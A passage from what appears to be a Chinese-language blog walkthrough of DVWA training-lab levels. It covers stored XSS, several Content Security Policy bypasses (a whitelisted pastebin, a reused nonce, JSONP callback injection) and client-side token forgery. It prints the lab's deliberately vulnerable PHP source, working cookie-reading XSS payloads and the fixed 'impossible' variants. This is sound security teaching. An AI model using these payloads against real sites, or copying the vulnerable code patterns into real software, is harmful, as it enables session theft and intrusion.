((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>high难度与medium难度相比，在name变量的过滤规则上更加完善，杜绝了双写和大小写变换，那我们使用其他标签即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226153256482.png" alt="image-20210226153256482"></p>
<h3 id="Impossible-11"><a href="#Impossible-11" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>impossible难度下name和message参数都做了严格的检查过滤，都把HTML标签转换为实体字符，同时还使用token防止CSRF攻击，而且还对更新数据库的语句使用了预编译，防止了SQL注入。</p>
<h2 id="CSP-Bypass-内容安全策略绕过"><a href="#CSP-Bypass-内容安全策略绕过" class="headerlink" title="CSP Bypass 内容安全策略绕过"></a>CSP Bypass 内容安全策略绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, jquery and google analytics.</span></span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://pastebin.com/raw/R570EE00</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>从代码中可以看出白名单的网址，其中的 pastebin.com 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226160000827.png" alt="image-20210226160000827"></p>
<p>然后将网址URL复制到文本框中，点击include即可，这里浏览器阻止了js脚本的执行。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226162235354.png" alt="image-20210226162235354"></p>
<h3 id="Medium-10"><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>这里使用了 nonce 阮一峰博客里面这么说明的 <code>script-src</code>还可以设置一些特殊值。</p>
<ul>
<li><code>unsafe-inline</code>：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li>
<li>**<code>unsafe-eval</code>**：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
<li><code>nonce</code>：每次HTTP回应给出一个授权 token，页面内嵌脚本必须有这个 token，才会执行</li>
<li><code>hash</code>：列出允许执行的脚本代码的 Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226164137912.png" alt="image-20210226164137912"></p>
<h3 id="High-12"><a href="#High-12" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clickButton();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到 CSP 规则这里十分苛刻，只能引用允许<code>self</code> 的脚本执行，<code>self</code>是指本页面加载的脚本。</p>
<p>首先审查元素拿到关键代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;csp&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>1+2+3+4+5=<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;answer&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;solve&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Solve the sum&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;source/high.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>id=”solve” 对应下面的 JS 代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clickButton();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后触发 <code>clickButton()</code> 函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数会创建一个 <code>script</code> 标签，内容如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8888/vulnerabilities/csp/source/jsonp.php?callback=solveSum&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个时候浏览器就会发起如下请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;vulnerabilities&#x2F;csp&#x2F;source&#x2F;jsonp.php?callback&#x3D;solveSum</span><br></pre></td></tr></table></figure>
<p>访问这个 jsonp.php 会得到如下请求：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">solveSum(&#123;&quot;answer&quot;:&quot;15&quot;&#125;)</span><br></pre></td></tr></table></figure>
<p>然后就会调用 JS 的 solveSum 函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将结果输出到 网页当中，完整的流程是这样，比较繁琐和复杂。</p>
<p>这个时候如果将 callback 参数换成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jsonp.php?callback&#x3D;alert(document.cookie)</span><br></pre></td></tr></table></figure>
<p>就会得到如下返回值：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226170032755.png" alt="image-20210226170032755"></p>
<p>此时 JS 调用执行的话就会触发弹窗。</p>
<p>但是怎么去修改 callback 参数呢？幸运的是这一关留了一手：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>POST 提交的 include 参数直接放到了 body 源码中，这里我们可以自己改造 include 来进行弹窗：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include&#x3D;&lt;script src&#x3D;source&#x2F;jsonp.php?callback&#x3D;alert(document.cookie)&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226170239874.png" alt="image-20210226170239874"></p>
<h3 id="Impossible-12"><a href="#Impossible-12" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>impossible难度下后端php部分没有改变</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp_impossible.php&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clickButton();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>js部分，访问了另一个URL <code>&quot;source/jsonp_impossible.php&quot;</code> ，这个URL没有参数可以输入，那么就不存在注入的地方。</p>
<h2 id="JavaScript-Attacks-JS-攻击"><a href="#JavaScript-Attacks-JS-攻击" class="headerlink" title="JavaScript Attacks JS 攻击"></a>JavaScript Attacks JS 攻击</h2><p>Low</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= &lt;&lt;&lt;EOF</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">/*MD5 code from herehttps://github.com/blueimp/JavaScript-MD5*/</span></span><br><span class="line"><span class="comment">/*这里省略一端MD5生成的代码*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rot13</span>(<span class="params">inp</span>) </span>&#123;    </span><br><span class="line">	<span class="keyword">return</span> inp.replace(/[a-zA-Z]/g,<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="keyword">String</span>.fromCharCode((c&lt;=<span class="string">&quot;Z&quot;</span>?<span class="number">90</span>:<span class="number">122</span>)&gt;=(c=c.charCodeAt(<span class="number">0</span>)+<span class="number">13</span>)?c:c<span class="number">-26</span>);&#125;);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">	<span class="keyword">var</span> phrase = document.getElementById(<span class="string">&quot;phrase&quot;</span>).value;  </span><br><span class="line">    document.getElementById(<span class="string">&quot;token&quot;</span>).value = md5(rot13(phrase));  </span><br><span class="line">&#125;  </span><br><span class="line">generate_token();</span><br><span class="line">&lt;/script&gt;EOF;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>当我们输入success点击提交的时候显示token无效</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226175445117.png" alt="image-20210226175445117"></p>
<p>审查一下页面元素，在前端有一段生成token的语法，把id为phrase的input框里面的值拿出来生成token，由于我们网页加载时候input里面默认的初始值是ChangeMe，因此这时候生成的token是ChangeMe的值</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226195746129.png" alt="image-20210226195746129"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;low_js&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;8b479aefbd90795395b3e7089ae0dc09&quot;</span> <span class="attr">id</span>=<span class="string">&quot;token&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;phrase&quot;</span>&gt;</span>Phrase<span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phrase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ChangeMe&quot;</span> <span class="attr">id</span>=<span class="string">&quot;phrase&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;send&quot;</span> <span class="attr">name</span>=<span class="string">&quot;send&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当我们提交的时候，就是把ChangeMe生成的token值，和我们输入的phrase的值（success）上传到后端，后端再将success生成token和上传上来的token比较，一样的话就成功，否则就返回invalid token，由于我们上传的token值是ChangeMe生成的，自然与success生成的token值不同。</p>
<p>由于生成token的方法是在前端的js代码，因此我么可以直接在控制台调用generate_token()，生成新的token值，发现此时的token值已经改变。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226202033997.png" alt="image-20210226202033997"></p>
<p>然后再提交即可。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226201854462.png" alt="image-20210226201854462"></p>
